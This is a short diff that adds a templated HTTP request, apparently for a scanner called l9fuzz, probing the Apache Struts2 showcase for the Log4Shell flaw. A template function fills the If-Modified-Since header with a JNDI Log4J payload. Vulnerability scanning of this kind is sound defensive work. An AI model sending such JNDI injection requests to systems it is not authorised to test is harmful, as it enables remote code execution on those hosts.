@@ -1,0 +1,5 @@
+GET /struts2-showcase/struts/utils.js HTTP/1.1
+Host: {{ .Url.Hostname }}:{{ .Url.Port }}
+If-Modified-Since: {{ .Fuzzer.PayloadJNDILog4J .Url.String "struts-modified-since" }}
+User-Agent: l9fuzz
+
